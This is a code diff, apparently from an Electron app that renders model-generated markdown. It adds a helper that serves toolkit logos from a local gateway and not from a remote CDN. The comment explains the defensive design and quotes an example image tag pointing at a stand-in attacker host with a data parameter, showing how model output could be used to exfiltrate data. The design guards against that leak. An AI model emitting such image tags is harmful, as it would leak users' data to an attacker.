@@ -1952,6 +1952,17 @@ async function electronComposioConnect(apiKey: string): Promise<ComposioConnectR
   );
 }
 
+/** Where to load a toolkit's brand logo from: the GATEWAY, never the remote CDN.
+ *
+ *  The renderer's CSP allows no remote image origin, and that is deliberate — the app renders
+ *  model-generated markdown, where an `<img src="https://attacker/?data=…">` would be a ready-made
+ *  exfiltration channel. So the gateway fetches the logo and serves it from loopback, and the CSP stays
+ *  free of remote hosts. Unauthenticated by necessity: an `<img>` tag cannot carry the bearer token
+ *  (same reason as `/api/ws` and the noVNC assets), and it only ever returns a public brand icon. */
+export function composioLogoUrl(slug: string): string {
+  return `${DESKTOP_GATEWAY_URL}/api/capabilities/composio/toolkits/${encodeURIComponent(slug)}/logo`;
+}
+
 async function electronComposioToolkits(): Promise<ComposioToolkit[]> {
   const payload = await gatewayGetJson<{ toolkits: ComposioToolkit[] }>(
     "/api/capabilities/composio/toolkits",
